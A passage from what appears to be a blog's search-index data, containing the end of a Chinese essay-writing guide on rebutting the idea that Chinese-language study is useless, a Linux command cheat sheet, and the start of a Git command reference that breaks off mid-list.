幅获赞无数的感恩海报，体现语文的审美鉴赏与创造功能。材料四，指明学习语文对理解和传承传统文化的意义，提升中国的文化自信等。2、明确任务指令“学生小陈经常在班上宣扬语文学习无用论”这是写作的情境与背景；“作为小陈的同学”指明了写作者的身份；“请你写一篇驳论文来反驳小陈”任务指令明确要写驳论文，驳斥的对象是小陈的“语文学习无用论”。驳斥的立足点就是四则材料体现的不同角度的语文学习的价值。【知识链接】驳论文是议论文常见的论证文体，在对一些社会丑陋现象的批判与揭露上价值尤为突出，这种文体一般是先指出对方错误的实质，或直接批驳(驳论点)，或间接批驳(驳论据、驳论证)；继而，针锋相对地提出自己的观点并加以论证。驳论是跟立论紧密联系着的，因为反驳对方的错误论点，往往要针锋相对地提出自己的正确论点，以便彻底驳倒错误论点。这类文章写作有一个常有思路，那就是：列现象—示弊端—探根源—指出路。典型示例就是《拿来主义》。3、其他要求除所有作文题都有的泛泛的要求外，注意几点。“结合材料”：表明不能丢掉了前面四则材料的具体内涵，应有所解读，并加以利用。“切合身份，贴合情境”：题目设定了“小陈的同学”的写作身份，应该是同学之间的对话、探讨与辩论，行文应符合中学生的身份，做到有礼有节，有理有据，而不宜以师长口吻一味教化，或者罔顾同学情谊，涉及人身攻击。（二）、确定立意①语文作为基础学科，它有明显的工具性；语文具有审美和育人功能，它有突出的人文性。②语言交流，语文不可或缺；审美鉴赏，语文不可或缺；修身养性，语文不可或缺。③语文是交流的工具、文化的载体、生命的烙印；语文的内容包罗万象，语文的价值无法估量；语文向外化为言语，语文向内滋养心灵。（三）、范文欣赏语文世界，大有乾坤“重理轻文”已是当下教育的流行病，许多学生都认为语文不像数理化英那样解决实际问题，学习语文没有用。最近小陈同学在班上大力宣扬语文学习无用论，正是这种思想的表现。对此，我表示很不认同，我认为语文世界大有乾坤，学好语文，受益终身。【概述材料，进入情境，明确表达观点，完成写作任务。】——总“语文”的“语”，即语言，是我们日常表达所必需的；“文”即文字、文化，是传递信息、传承文化的载体。【贯穿全文的脉络，提纲挈领】学好语文，可以提升我们的“听说读写”能力。【观点句】《语文课程标准》明确指出，“语文是最重要的交际工具。”毋庸置疑，作为表情达意、交流思想的载体，“交流”是语文最基本最重要的美。具体形式表现在“听说读写”上，会听、巧说、善读、能写，是语文最基本的素养和要求。语文的“听说读写”，关键时刻能抵得上千军万马，发挥出无可匹敌的力量。【阐释句】如诸葛亮舌战群儒，最终促成孙刘联合抗曹的统一战线，演绎了“听和说”的故事经典；鲁迅的《狂人日记》，犹如一把匕首刺向敌人心脏，唤醒了许多国人麻木的心灵，绽放了“读和写”的犀利惊艳。【事例句】认为语文学习无用的小陈同学们，如果你们没有语文学习培养起来的“听说读写”的能力，你们连表达“语文无用”的观点都很难。【议论句，紧扣材料背景】“语文无用论”，实为谬论！【总结句】学好语文，可以用文字传递温暖与力量，传递美好与希望。【观点句】正如疫情结束后武汉用配上美言的感恩海报表达对各省医疗队的感恩、传递美好与希望一样，【用一句话，扣合材料】李白的“天生我才必有用，千金散尽还复来”激励无数后人走出自卑的泥潭；苏轼的“回首向来萧瑟处，归去，也无风雨也无晴”引领困境之人找到心灵出口；无数人喊出的简洁有力的“武汉加油”帮助武汉熬过至暗时刻……【事例句】此时的文字，可以穿越时空，跨越山海，直击心灵，传递力量！【议论句】语文之用，实为大用！【总结句】学好语文，可以更好地传承传统文化，提升民族自信。【观点句】横平竖直的汉字里隐含先人的风骨，之乎者也间蕴藏着古人的智慧，起承转合中表达着诗人的哲学，平平仄仄间承载着祖先的美学。从汉字到音律，从唐诗宋词元曲到明清小说，无不流淌着我们中华民族传承数千年的文化血脉。四大文明古国，能代代相传延续发展至今的，唯有中国，靠的是什么？靠的便是我们的语言和文字。先人的智慧与文化，以语言和文字为载体，代代相传并不断发扬壮大，让我们面对无数次历史浩劫时拥有强大的精神力量和底气。【夹叙夹议】正如面对美国的恶意诋毁时以“行有不得，反求诸己”有力回击的耿爽，不仅不输回击之势，还展现了我大国气度及我中华文化底蕴。【用一句话，扣合材料】“语文无用论”，可以休矣！【三个文段的总结句，层层深入】——分语文，既帮助我们潜入平凡琐碎的生活，又指引我们在平凡中开出灿烂的花；既给予我们活在当下的力量，又赐予我们穿越时空与伟人握手的神力；既承载着我们生生不息的文化血脉，又创造着我们繁荣昌盛的时代蓝图。【结尾运用一组排比句总结语文的作用，扣题。】语文世界，大有乾坤！【再次点题】——总\n","categories":["dc资料"],"tags":["语文"]},{"title":"linux命令","url":"/2025/02/16/linux/linux%E5%91%BD%E4%BB%A4/","content":"基础命令cd : 切换目录cd :切换路径cd ~ 切换到当前用户的家目录cd . 切换到当前路径cd .. 切换到上一级路径cd ..&#x2F;.. 切换到上上级路径(其中：在linux中路径分隔符为斜杠&#x2F;)cd - 切换到上一次的路径\n\nls : 列出目录内容ls:列出目录内容ls -l:列出详细信息ls -a:列出全部文件信息，包括隐藏文件ls -d:列出目录详细信息ls -h:列出文件信息并显示文件大小单位\n\nalias&#x2F;unalias  : 命令别名&#x2F;取消命令别名alias 别名&#x3D;’命令’ :给命令起别名unalias 别名 :取消命令别名unalias -a 别名 :取消所有别名 \n\nmv : 移动、重命名文件mv 旧文件名 新文件名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改文件名如：mv file1 filea将当前目录的文件file1改名为fileamv 旧目录名 新目录名 &#x3D;&#x3D;&#x3D;&#x3D;&gt;修改目录名如：mv dir1 dira将当前目录下的目录dir1改为dira​mv 文件名  目录名  &#x3D;&#x3D;&#x3D;&#x3D;&gt;移动路径如：mv filea dira将当前目录下filea移动到dira子目录如：mv filea ~ 将当前目录下filea移动家目录如：mv ~&#x2F;filea ..将家目录下的fila移动到上一个路径\n\ncp ：复制文件(目录)&#x3D;&#x3D;复制 cp -r 目录 -v 详细 -f 强制 -n 静默​1） cp 源文件名 目标文件名举例： cp File1 file2将当前目录下的文件File1拷贝成file2\n2） cp 源文件名 目标目录名举例：cp file2 dira&#x2F;将当前目录下的文件file2拷贝到dira子目录​3） cp 源目录名 目标目录名举例：cp -r dira dirb复制dira目录下的所有内容到dirb。其中,-r参数是递归复制cp -i file2 dira如果dira目录下面有同名的file2，加入-i参数就会要求你确认是否覆盖同名的文件\n\nmkdir : 创建空目录mkdir dir1创建两个目录：mkdir &#x2F;home&#x2F;dir2 &#x2F;home&#x2F;dir3mkdir &#x2F;home&#x2F;{dir4,dir5}mkdir -v &#x2F;home&#x2F;{dir6,dir7} #-v ：verbose 冗长的。显示创建时的详细信息mkdir -p &#x2F;home&#x2F;dir8&#x2F;111&#x2F;222 #-p 创建连级目录，一级一级的创建rmdir : 删除空目录&#x3D;&#x3D;删除 rm -r 递归删除目录 -f force强制 -v 详细过程  *通配符\n​—\nrm:删除目录及内容rm -rf :删除所有touch : 创建空文件[root@linux-server ~]# touch file1.txt &#x2F;&#x2F;无则创建，如果存在修改时间[root@linux-server ~]# touch &#x2F;home&#x2F;file10.txt[root@linux-server ~]# touch &#x2F;home&#x2F;{zhuzhu,gougou} &#x2F;&#x2F;{}集合[root@linux-server ~]# touch &#x2F;home&#x2F;file{1..20} &#x2F;&#x2F;批量创建\n\necho : 写入echo 加内容 &gt; 加文件名 #覆盖:把之前的内容替换掉​echo 123 &gt; a.txtecho 加内容 &gt;&gt; 加文件名  #追加:保留之前的内容,在后面添加新内容​echo 345345 &gt;&gt; a.txt​当使用echo 123 &gt;&gt; a.txt 这个命令的时候在文件不存在的时候会创建该文件并将内容追加到改文件中\n\nstat : 详细查看文件访问时间等信息root@localhost ~] #stat file文件: “file”大小 : 24     块 ：8    IO块 : 4096  普通文件设备 : fdooh&#x2F;64768d   Inode : 35493573  硬链接∶1权限 : ( 0644&#x2F;- rw- r–r– )  Uid : ( 0&#x2F; root)  Gid : (  0&#x2F;  root）环境 : unconfined_u: object_r: admin_home_t: so最近访问:2023-04-05 11:31:37.678858345 +080O最近更改:2023-04-05 11:31:35.590867350 +080O最近改动:2023-04-05 11:31:53.385790608 +080O创建时间: -\n\nawk：以关键字分隔查看内容awk -F “:” ‘{print $2}’ 文件路径例如:[root@localhost ~]# cat &#x2F;home&#x2F;aaaaa:skas:asdd[root@localhost ~]# awk -F “:” ‘{print $2}’ &#x2F;home&#x2F;askas\n\nsort: 排序[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行参数详解：sort 排序，默认升序-t 指定分隔符-k 指定列-n 按数值-r 降序\n\nwc :统计数据wc -l :统计有多少行数据\n\nfind : 针对文件属性查找文件-name : 按文件名查找[root@localhost ~]# find &#x2F;var&#x2F;cache&#x2F;yum&#x2F; -name “.rpm” #查找&#x2F;var&#x2F;cache&#x2F;yum下以.rpm结尾的文件[root@localhost ~]# find &#x2F;etc -iname “Ifcfg-ens33”     #-i忽略大小写-size : 按文件大小查找[root@localhost ~]# find &#x2F;etc -size +5M  #查找大于5M[root@localhost ~]# find &#x2F;etc -size 5M  #等于5M[root@localhost ~]# find &#x2F;etc -size -5M  #小于5M​[root@localhost ~]# find &#x2F; -size +3M -a -size -5M   #查找&#x2F;下面大于3M而且小于5M的文件 —a:and[root@localhost ~]# find &#x2F; -size -1M -o -size +8M   #查找&#x2F;下面小于1M或者大于8M的文件 -o:or[root@localhost ~]# find &#x2F; -size -3M -a -name “.txt” #查找&#x2F;下面小于3M而且名字是以.txt结尾的文件-atime&#x2F;mtime&#x2F;ctime : 按时间查找-atime &#x3D; access访问时间            #单位是 天-mtime &#x3D; modify改变时间 内容修改时间会改变-ctime &#x3D; change修改时间 属性修改时间会改变​-amin #分钟-mmin-cmin[root@localhost ~]# find &#x2F;opt -mtime +5  #修改时间5天之前[root@localhost ~]# find &#x2F;opt -atime -1  #访问时间1天之内[root@localhost ~]# find . -amin +1    #访问时间在1分钟之前-type : 按文件类型查找-type f:普通文件-type l:链接文件-type d:目录文件-type b:设备文件[root@localhost ~]# find &#x2F;dev -type f-perm : 按文件权限[root@localhost ~]# find . -perm 644     #查找当前目录下权限是644的文件或目录[root@localhost ~]# find &#x2F;usr&#x2F;bin -perm -4000 #包含set uid-exec&#x2F;xargs : 参数传递-exec:参数是一个一个传递的，传递一个参数执行一次命令。[root@localhost ~]# find &#x2F;etc -name “ifcfg*” -exec cp -rf {} &#x2F;tmp ;   #exec命令查找带ifcfg开头的文件复制到tmp下[root@localhost ~]# find &#x2F;home&#x2F; -name test* -exec tar cvzf test.tar.gz {} ; #由于-exec是一次一次执行，所以会产生覆盖导致最终只会产生一个tar.gz文件，故需要将 “;” 改成 “+;”xargs:将前一个命令的标准输出传递给下一个命令，作为它的参数转换成下一个命令的参数列表。[root@localhost ~]# find &#x2F;home&#x2F; -name “test*” | xargs -i cp {} &#x2F;tmp&#x2F; #找到之后删除处理xargs 参数传递区别：1、exec每处理一个文件或者目录，它都需要启动一次命令，效率不好;2、xargs不能操作文件名有空格的文件；\n\nping : 检查主机是否可以联网[root@linux-server ~]# ping www.baidu.com  #ping命令，可以检查主机是否可以联网PING www.a.shifen.com  (183.232.231.174) 56(84) bytes of data.​[root@linux-server ~]# ping -c 3 www.baidu.com -c：指定次数ntp ：实现服务器对时[root@localhost ~]# yum install ntp[root@localhost ~]# ntpdate ntp.aliyun.com[root@localhost ~]# ntpdate cn.pool.ntp.org #cn.pool.ntp.org是ntp网络授时组织的中国授时源\n\nwhich ：查找命令[root@localhost ~]# which cd&#x2F;usr&#x2F;bin&#x2F;cd\n\n查看文件内容cat：查看一个文件的全部内容cat -n : 显示行号cat -A : 显示控制字符\n\nhead ：头部[root@linux-server ~]# head &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看前十行[root@linux-server ~]# head -2 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看前两行tail ：尾部[root@linux-server ~]# tail &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看文件的后十行[root@linux-server ~]# tail -1 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看文件最后一行[root@linux-server ~]# tail &#x2F;var&#x2F;log&#x2F;messages[root@linux-server ~]# tail -f &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;-f 动态查看文件的尾部[root@linux-server ~]# tailf &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;功能同上\n\ngrep：过滤关键字\t过滤文件中带有root的内容：[root@linux-server ~]# grep ‘root’ &#x2F;etc&#x2F;passwd过滤以root开头的行：^ –以什么开头[root@linux-server ~]# grep ‘^root’ &#x2F;etc&#x2F;passwd过滤以bash结尾的行：$ –以什么结尾[root@linux-server ~]# grep ‘bash$’ &#x2F;etc&#x2F;passwd\n\nless ：分页显示[root@linux-server ~]# less &#x2F;etc&#x2F;makedumpfile.conf.sample1.空格键是翻页 回车键是翻行2.上下箭头可以来回翻3.&#x2F;关键字  #搜索 (n按关键字往下翻 N按关键字往上翻)4.快捷键:q -quit 退出more ：分页显示文件内容[root@localhost ~]# more 文件名空格键是翻页 回车键是翻行\n用户管理useradd &#x2F; userdel &#x2F; usermod  ： 用户管理-M : 不创建用户主目录-r : 创建系统用户​[root@linux-server ~]# useradd user02 -u 503 &#x2F;&#x2F;指定uid为503[root@linux-server ~]# useradd user05 -s &#x2F;sbin&#x2F;nologin &#x2F;&#x2F;创建用户并指定shell[root@linux-server ~]# useradd user07 -G it,fd &#x2F;&#x2F;创建用户，指定附加组[root@linux-server ~]# useradd -g 1003 user8 #指定用户的主属组为1003组。[root@linux-server ~]# useradd user10 -u 4000 -s &#x2F;sbin&#x2F;nologinuserdel -r ：完全删除用户\n1.修改用户名：-l[root@linux-server ~]# usermod -l NEW_name user8[root@linux-server ~]# id user8id: user8：无此用户\n2.修改GID：-g[root@linux-server ~]# id user10uid&#x3D;1000(user10) gid&#x3D;1000(tom) groups&#x3D;1000(tom)[root@linux-server ~]# usermod user10 -g new_gid #gid需要提前存在\n3.修改UID-u[root@linux-server ~]# usermod -u new_id jack[root@linux-server ~]# id jackuid&#x3D;1005(jack) gid&#x3D;1004(jack) groups&#x3D;1004(jack)\n4.修改用户的登录shell-s[root@linux-server ~]# usermod -s &#x2F;sbin&#x2F;nologin user07 #修改用户的登录shellgroupadd &#x2F; groupmod &#x2F; groupdel：组管理[root@linux-server ~]# groupadd hr &#x2F;&#x2F;创建一个用户组叫hr[root@linux-server ~]# groupadd net01 -g 2000 &#x2F;&#x2F;创建组叫net01，并指定gid为2000[root@linux-server ~]# grep ‘net01’ &#x2F;etc&#x2F;group &#x2F;&#x2F;查看&#x2F;etc&#x2F;group中组net01信息net01:x:2000:[root@linux-server ~]#groupmod 参数 组名-g：修改组的gid-n：修改组名[root@linux-server ~]#groupmod -g 2000 grp1[root@linux-server ~]#groupmod -n 新组名 grp1[root@linux-server ~]# groupdel net01 #删除组net01注意：用户的主属组不能删除gpasswd : 组成员管理注意：只针对已存在的用户\n\n1.给组添加账户-a[root@linux-server ~]# gpasswd -a user10 grp2Adding user user10 to group grp22.同时添加多个用户到组-M:members成员的缩写[root@linux-server ~]# gpasswd -M tom,alice it （会覆盖该组之前的组成员）3.从组删除用户-d[root@linux-server ~]# gpasswd -d user07 hr\n权限管理chown:改变文件或目录的所属主以及所属组chown :（chown 属主.属组 文件名）​[root@linux-server ~]# chown alice.hr file1.txt &#x2F;&#x2F;修改属主、属组[root@linux-server ~]# chown tom file1.txt &#x2F;&#x2F;修改属主[root@linux-server ~]# chown .it file1.txt &#x2F;&#x2F;只改属组​[root@linux-server ~]# chown -R alice.hr dir1 &#x2F;&#x2F;递归修改—针对目录chmod : 更改权限基本权限类型：读 ：r —-&gt; 4写 ：w —-&gt; 2执行: x(exec) —–&gt; 1​[root@linux-server ~]# chmod -R a&#x3D;rwx dir1 &#x2F;&#x2F;递归更改目录及其中文件的权限\na. 使用符号*​[root@linux-server ~]# chmod u+x file1.txt  &#x2F;&#x2F;属主增加执行[root@linux-server ~]# chmod a&#x3D;rwx file1.txt &#x2F;&#x2F;所有人等于读写执行[root@linux-server ~]# chmod a&#x3D;- file1.txt &#x2F;&#x2F;所有人都没有权限[root@linux-server ~]# chmod ug&#x3D;rw,o&#x3D;r file1.txt &#x2F;&#x2F;属主属组等于读写，其他人只读[root@linux-server ~]# ll-rw-rw-r–. 1 tom it  0 Nov 1 15:30 file1.txt\nb.使用数字*​[root@linux-server ~]# chmod 644 file1.txt[root@linux-server ~]# ll file1.txt-rw-r–r–. 1 tom it 0 Nov 1 15:30 file1.txt​[root@linux-server ~]# chmod 755 file1.txt[root@linux-server ~]# ll-rwxr-xr-x 1 root root 0 Jul 23 22:40 file1.txt​[root@linux-server ~]# chmod 521 file1.txt[root@linux-server ~]# ll-r-x-w—x 1 root root 0 Jul 23 22:40 file1.txt\n\nchgrp : 更改属组[root@linux-server ~]# chgrp hr file1.txt &#x2F;&#x2F;更改文件file1.txt所属组为hr​[root@linux-server ~]# chgrp -R hr dir1 &#x2F;&#x2F;递归更改目录dir1及其中文件所属组为hr \n\nACL权限getfacl ：查看文件或目录当前设定的 ACL 权限信息[root@localhost ~]# getfacl 文件名setfacl ：直接设定用户或群组对指定文件的访问权限setfacl -m：给用户或群组添加 ACL 权限chattr：文件隐藏属性\n\n[root@linux-server ~]# touch file1 file2 file31.查看文件属性[root@linux-server ~]# lsattr file1 file2 file3  #查看文件隐藏属性—————- file1—————- file2—————- file32.设置权限[root@linux-server ~]# chattr +a file1 #不允许修改，只允许追加[root@linux-server ~]# chattr +i file2 #不允许做任何操作[root@linux-server ~]# chattr +A file3[root@linux-server ~]# lsattr file1 file2 file3—–a———- file1—-i———– file2——-A——– file3​i:即Immutable，系统不允许对这个文件进行任何的修改a：即Append Only，系统只允许在这个文件之后追加数据，不允许任何覆盖或截断这个文件A：即Atime，告诉系统不要修改对这个文件的最后访问时间​取消权限[root@linux-server ~]# chattr -a file1[root@linux-server ~]# chattr -i file2管道与重定向awk：过滤并输出文件中符合条件的内容awk -F “分隔符” ‘{print $第几列}’[root@localhost ~]# cat &#x2F;home&#x2F;aaasdjlasjlkasldjasjlkdasjl[root@localhost ~]# grep ‘sd’ &#x2F;home&#x2F;aaa | awk -F “j” ‘{print $2}’ #过滤aaa中的一行内容然后将结果通过管道传递给                  awk，过滤并输出以j为分隔符的第二列内容lassort: 排序[&#x72;&#x6f;&#x6f;&#116;&#x40;&#113;&#102;&#x65;&#100;&#x75;&#x2e;&#99;&#x6f;&#x6d;  ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序[&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#x66;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#x6d;  ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序[&#x72;&#x6f;&#111;&#x74;&#x40;&#113;&#x66;&#x65;&#x64;&#117;&#x2e;&#99;&#x6f;&#x6d;  ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行[&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#x66;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#109;  ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行参数详解：sort 排序，默认升序-t 指定分隔符-k 指定列-n 按数值-r 降序head 默认输出前十行tail 默认输出后十行xargs：参数传递对与 ls cp rm mv命令，管道不能执行。所以通过xargs实现。​ 语法: cat a.txt | xargs -i cp {} &#x2F;目录 {}:前面传过来的内容 -i ：为了让大括号生效 目录时 -r 解释：前面传过来的东西交给大括号\n cat file.txt |xargs ls -l 前面是目录或者目录的路径。 ls - l 后面可以不加大括号，直接执行。\n[&#x72;&#111;&#111;&#x74;&#x40;&#x71;&#102;&#101;&#100;&#117;&#x2e;&#99;&#111;&#109;  ~]# touch &#x2F;home&#x2F;file{1..5}[&#114;&#x6f;&#111;&#116;&#x40;&#x71;&#102;&#101;&#100;&#117;&#x2e;&#99;&#111;&#109;  ~]# # cat files.txt | xargs -i cp -rvf {} &#x2F;tmp&#x2F;‘&#x2F;home&#x2F;file1’ -&gt; ‘&#x2F;tmp&#x2F;file1’‘&#x2F;home&#x2F;file2’ -&gt; ‘&#x2F;tmp&#x2F;file2’‘&#x2F;home&#x2F;file3’ -&gt; ‘&#x2F;tmp&#x2F;file3’‘&#x2F;home&#x2F;file4’ -&gt; ‘&#x2F;tmp&#x2F;file4’‘&#x2F;home&#x2F;file5’ -&gt; ‘&#x2F;tmp&#x2F;file5’\n软件管理rpm：管理软件rpm -ivh 软件包：安装软件-i install 安装-vh verbose human 人性化显示安装过程-u upgrade 升级rpm -q{a,l,f} 软件包：查询＝＝查询(从本地的rpm数据库)-q query （查询）-l list （列出）-f file-a allrpm -ql 软件包名 ：列出某个软件包安装后，生成了哪些文件以及文件对应的存储位置​[root@linux-server ~]# rpm -qa | grep 软件名 # 查找软件是否安装[root@linux-server ~]# rpm -ql httpd     #查询http安装的文件[root@linux-server ~]# rpm -qf &#x2F;usr&#x2F;share&#x2F;httpd&#x2F;noindex  #查询该文件属于哪个包，只能查询已经安装好的软件rpm -e：删除软件语法：# rpm -e 软件名称-e erase的意思[root@linux-server ~]# rpm -e httpdyum：管理软件清理yum缓存:（元数据建立）yum clean all\n缓存软件包信息: 提高搜索&#x2F;安装软件的速度yum makecache查询yum源信息:  #也具有缓存功能yum repolist \n查看命令属于哪个软件yum provides rz \n查看系统已经安装好的软件和没有安装的软件（源里存在即可查到）:yum list\n安装软件:yum install 软件名称 \n进程管理ps aux&#x2F;ps -ef：静态查看进程[root@linux-server ~]# ps aux \nUSER   PID %CPU %MEM VSZ RSS TTY  STAT START TIME COMMAND============================================================================\nUSER:  #运行进程的用户PID： #进程ID%CPU: #CPU占用率%MEM: #内存占用率VSZ  进程占用的虚拟内存大小 ，一般以B为单位RSS  占用的物理内存大小TTY  终端 （？表示不占用终端） （? 表示没有占用终端）STAT： #进程状态 —了解START: #进程的启动时间TIME： #进程占用CPU的总时间COMMAND： #进程文件，进程名[root@linux-server ~]# ps aux | less参数解释：ps :process nsapashota 只能查看系统里面运行的所有终端进程u 显示进程拥有者x 显示系统内所有进程f 显示进程之间的父子关系[root@linux-server ~]# ps -ef参数解释：-e 显示所有进程-l 长格式显示-f 完整格式cat … ：查看单个PID[root@linux-server ~]# systemctl start httpd #启动[root@linux-server ~]# cat &#x2F;var&#x2F;run&#x2F;httpd&#x2F;httpd.pid1043ps aux | grep ‘进程名’：查看指定PID[root@linux-server ~]# ps aux | grep sshdroot       1043  0.0  0.2 105996  4120 ?        Ss   01:32   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd -D\n\nnetstat -tlanp：查看端口ip地址： 为了确定一个服务器在互联网的位置服务端口： 为了确定一个服务在服务器中位置#查网络进程和正在监听的端口[root@linux-server ~]# netstat -tlanp    (该命令对应的包名：net-tools)参数详解：-a  显示全部的进程-u  显示udp-n  以数字的新式显示协议名称-t   tcp-p：显示进程的名称和pid-l :只显示正在被监听的端口\n[root@localhost ~]# netstat -alntp | grep ‘sshd’（可跟端口号&#x2F;进程名&#x2F;PID）       ##可查看到sshd服务的端口号是22tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1106&#x2F;sshdtcp        0      0 192.168.201.142:22      192.168.201.1:10025     ESTABLISHED 17303&#x2F;sshd: root@notcp        0      0 192.168.201.142:22      192.168.201.1:10024     ESTABLISHED 17034&#x2F;sshd: root@notcp      104      0 192.168.201.142:22      192.168.201.1:9813      ESTABLISHED 1820&#x2F;sshd: root@ptstcp6       0      0 :::22                   :::*                    LISTEN      1106&#x2F;sshdlsof -i:端口号  ：根据端口号查询进程[root@linux-server ~]# yum install lsof  #安装软件包[root@linux-server ~]# lsof -i:80   #端口号，这能查看带端口的进程COMMAND   PID   USER   FD   TYPE  DEVICE SIZE&#x2F;OFF NODE NAMEhttpd   64249   root    4u  IPv6 1373628      0t0  TCP *:http (LISTEN)top：动态查看进程[root@linux-server ~]# top  #动态显示信息，三秒刷新一次。\n\nkill&#x2F;pkill：进程控制kill,pkill语法： kill 信号 PID   #信号也是进程间通信的一种方式     pkill 信号 进程名[root@linux-server ~]# kill -l   #查看所有信号-1   HUP  重新加载进程或者重新加载配置文件,PID不变-9   KILL 强制杀死-15  TERM 正常杀死(这个信号可以默认不写)-18  CONT 激活进程-19  STOP 挂起进程\n进程状态解释–了解：+：表示运行在前台的进程组S+：休眠状态T+：暂停，挂起状态s：父进程jobs：作业控制sleep 工作号 &amp; \t\t:让命令或程序后台运行sleep 工作号 #ctrl Z   :把程序从前台放到后台并暂停jobs \t\t\t\t  :查看后台工作号bg %工作序号 \t\t   :让暂停的程序在后台运行fg %工作序号\t\t   :将后台的程序调到前台\n常用命令uptime : 查看当前CPU负载free -m : 查看内存使用情况查看系统版本和内核[root@linux-server ~]# cat &#x2F;etc&#x2F;redhat-release  #查看版本CentOS Linux release 7.4.1708 (Core)[root@linux-server ~]# uname -a #看查正在运行的内核版本Linux linux-server 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux[root@linux-server ~]# uname -r  #查看内核版本3.10.0-693.el7.x86_64修改主机名[root@linux-server ~]# hostnamectl set-hostname  xxxx   #主机名，修改完之后断开与终端连接，然后在重新连接即可。查看主机名[root@linux-server ~]# hostname\nvim &#x2F;etc&#x2F;hostname   #直接更改hostname，然后reboot重启lrzsz : 上传下载yum install -y lrzsz上传rz下载sz 文件\n计划任务at : 一次调度执行at使用规则[root@linux-server ~ ]# yum -y install at[root@linux-server ~ ]# systemctl status atd    #查看启动状态[root@linux-server ~ ]# systemctl start atd\t\t#首先要启动服务方式一：[root@linux-server ~ ]# at now +1min    #一分钟后开始执行at&gt; useradd uuuuat&gt;      \t#Ctrl+Djob 1 at Sat Mar 21 22:34:00 2015方式二：[root@linux-server ~ ]# vim at.jobsuseradd u99[root@linux-server ~ ]# at 20:33 &lt; at.jobs   #在20：33执行计划任务\nat是以输入重定向方式将文件中的内容输入给at调度执行任务，所以不需要执行文件，即不需要给予执行权限。atq : 查看一次性计划任务2\tTue Aug  9 14:29:00 2022 a rootatrm : 删除一次性计划任务\n# atrm  计划任务序号\ncron ：循环调度执行  用户级\tcrontab -l\t\t\t\t&#x2F;&#x2F;列出当前用户的计划任务crontab -r\t\t\t\t&#x2F;&#x2F;删除当前用户所有的计划任务\tcrontab -e\t\t\t\t&#x2F;&#x2F;编辑当前用户的计划任务crontab -u username     &#x2F;&#x2F;（仅管理员可使用）管理其他用户的计划任务\n","categories":["linux"],"tags":["linux"]},{"title":"常用 Git 命令集合","url":"/2025/04/20/linux/%E5%B8%B8%E7%94%A8%20Git%20%E5%91%BD%E4%BB%A4%E9%9B%86%E5%90%88/","content":"Git 基础配置配置用户信息在使用 Git 前，首先需要配置用户信息：\ngit config --global user.name \"Your Name\"git config --global user.email \"your.email@example.com\"\n\n查看当前配置信息：\ngit config --list\n\nSSH 密钥配置为了安全地连接 GitHub，需要配置 SSH 密钥：\n\n生成 SSH 密钥对：\nssh-keygen -t rsa -C \"youremail@example.com\"\n\n密钥默认生成在 ~/.ssh 目录下：\n\n公钥文件：id_rsa.pub\n私钥文件：id_rsa\n\n\n将公钥添加到 GitHub：\n\n复制 id_rsa.pub 文件内容\n访问 https://github.com/settings/keys \n点击 “New SSH key” 并粘贴公钥内容\n\n\n\n仓库基本操作创建本地仓库# 初始化 Git 仓库git init# 添加文件到暂存区git add .# 提交更改git commit -m '提交说明'\n\n远程仓库操作# 添加远程仓库git remote add origin git@github.com:用户名/仓库名.git# 推送到远程仓库（首次推送需要-u参数）git push -u origin master# 从远程仓库克隆git clone &lt;仓库远程地址&gt;# 拉取远程更新git pull origin master\n\n日常工作命令查看状态和差异# 查看仓库状态git status# 查看文件差异git diff# 查看提交历史git log  # 详细历史git log --oneline  # 简洁版本git log --graph  # 分支合并图\n\n版本控制# 回退版本git reset [--soft | --mixed | --hard] HEAD^# 撤销提交git revert &lt;commit-id&gt;# 暂存工作区git stashgit stash list  # 查看暂存列表git stash pop   # 恢复并删除暂存\n\n分支管理# 创建并切换分支git checkout -b &lt;branch-name&gt;# 切换分支git checkout &lt;branch-name&gt;# 合并分支git merge &lt;branch-name&gt;# 删除分支git branch -d &lt;branch-name&gt;# 查看分支git branch      # 本地分支git branch -r   # 远程分支git branch -a   # 所有分支\n\n标签管理# 创建标签git tag &lt;tagname&gt;# 创建带说明的标签git tag -a &lt;tagname&gt; -m \"tag message\"# 查看所有标签git tag# 查看标签信息git show &lt;tagname&gt;\n\n撤销修改# 丢弃工作区的修改git checkout -- &lt;file&gt;# 撤销暂存区的修改git reset HEAD &lt;file&gt;\n\n删除文件# 删除文件并暂存此次删除git rm &lt;file&gt;# 从暂存区移除文件，但保留在工作区git rm --cached &lt;file&gt;\n\n远程仓库操作扩展# 重命名远程仓库git remote rename &lt;old-name&gt; &lt;new-name&gt;# 删除远程仓库git remote rm &lt;repository&gt;# 从远程获取代码库git fetch &lt;remote&gt;\n\n高级操作变基操作# 将当前分支变基到指定分支git rebase &lt;branch&gt;# 交互式变基最近三次提交git rebase -i HEAD~3\n\n储存凭证# 永久储存凭证git config --global credential.helper store\n\n清理仓库# 删除所有未跟踪的文件git clean -f# 删除所有未跟踪的文件和目录git clean -fd# 压缩和清理仓库git 